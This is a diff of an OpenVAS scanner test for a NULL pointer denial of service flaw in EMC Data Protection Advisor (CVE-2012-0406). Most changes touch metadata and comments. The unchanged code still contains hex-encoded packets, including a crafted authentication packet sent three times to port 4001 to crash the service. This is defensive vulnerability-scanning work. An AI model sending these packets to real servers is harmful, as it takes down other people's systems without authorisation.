@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_emc_dpa_dos_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
+# $Id: gb_emc_dpa_dos_vuln.nasl 11421 2018-09-17 06:58:23Z cfischer $
 #
 # EMC Data Protection Advisor NULL Pointer Dereference Denial of Service Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802827");
-  script_version("$Revision: 11374 $");
+  script_version("$Revision: 11421 $");
   script_cve_id("CVE-2012-0406", "CVE-2012-0407");
   script_bugtraq_id(52833, 53164);
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 08:58:23 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-04-04 14:58:28 +0530 (Wed, 04 Apr 2012)");
   script_name("EMC Data Protection Advisor NULL Pointer Dereference Denial of Service Vulnerability");
   script_category(ACT_DENIAL);
@@ -50,14 +50,19 @@ if(description)
 
   script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial of
   service condition.");
+
   script_tag(name:"affected", value:"EMC Data Protection Advisor version 5.8.1 Build 5991 and prior");
+
   script_tag(name:"insight", value:"The flaw is due to an NULL pointer dereference error in the DPA
   Controller and Listener service when processing certain authentication
   packets sent to port 3916/TCP and 4001/TCP, which could be exploited by
   remote attackers to crash an affected server.");
+
   script_tag(name:"solution", value:"Vendor has released a patch to fix this issue, please refer below
   link for patch details.
+
   http://seclists.org/bugtraq/2012/Apr/att-132/ESA-2012-018.txt");
+
   script_tag(name:"summary", value:"This host is running EMC Data Protection Advisor and is prone to
   denial of service vulnerability.");
 
@@ -67,15 +72,11 @@ if(description)
   exit(0);
 }
 
-
-## EMC Data Protection Advisor Listener default port
 dpaPort = 4001;
-
 if(!get_port_state(dpaPort)){
   exit(0);
 }
 
-##  Open tcp socket
 soc = open_sock_tcp(dpaPort);
 if(!soc){
   exit(0);
@@ -88,17 +89,15 @@ req = raw_string(0x34, 0x34, 0x2f, 0x34, 0x34, 0x2f, 0x55, 0x4e, 0x42,
                  0x20, 0x2f, 0x3e, 0x3c, 0x2f, 0x4c, 0x58, 0x4d, 0x4c,
                  0x52, 0x45, 0x51, 0x55, 0x45, 0x53, 0x54, 0x3e);
 
-## Sending Request
 send(socket:soc, data:req);
 
-## Receive header
 res  = recv(socket:soc, length:1024);
 
 if("<PRODUCT>DPA</PRODUCT>" >!< res){
   exit(0);
 }
 
-## Request to Set the Encryption
+# nb: Request to Set the Encryption
 req1 = raw_string(0x31, 0x33, 0x35, 0x2f, 0x31, 0x33, 0x35, 0x2f, 0x55,
                   0x4e, 0x42, 0x3c, 0x4c, 0x58, 0x4d, 0x4c, 0x52, 0x45,
                   0x51, 0x55, 0x45, 0x53, 0x54, 0x3e, 0x3c, 0x53, 0x45,
@@ -117,8 +116,6 @@ req1 = raw_string(0x31, 0x33, 0x35, 0x2f, 0x31, 0x33, 0x35, 0x2f, 0x55,
                   0x58, 0x4d, 0x4c, 0x52, 0x45, 0x51, 0x55, 0x45, 0x53,
                   0x54, 0x3e);
 
-
-## send the data
 send(socket:soc, data:req1);
 res  = recv(socket:soc, length:1024);
 
@@ -128,7 +125,7 @@ if(!res)
   exit(0);
 }
 
-## Crafted Authentication Packet
+# nb: Crafted Authentication Packet
 req2 = raw_string(0x32, 0x32, 0x34, 0x2f, 0x32, 0x32, 0x34, 0x2f, 0x55,
                   0x4e, 0x42, 0x3c, 0x4c, 0x58, 0x4d, 0x4c, 0x52, 0x45,
                   0x51, 0x55, 0x45, 0x53, 0x54, 0x3e, 0x3c, 0x41, 0x55,
@@ -157,7 +154,6 @@ req2 = raw_string(0x32, 0x32, 0x34, 0x2f, 0x32, 0x32, 0x34, 0x2f, 0x55,
                   0x4d, 0x4c, 0x52, 0x45, 0x51, 0x55, 0x45, 0x53, 0x54,
                   0x3e);
 
-## send the the exploit multiple times
 for(i=0; i < 3; i++)
 {
   send(socket:soc, data:req2);
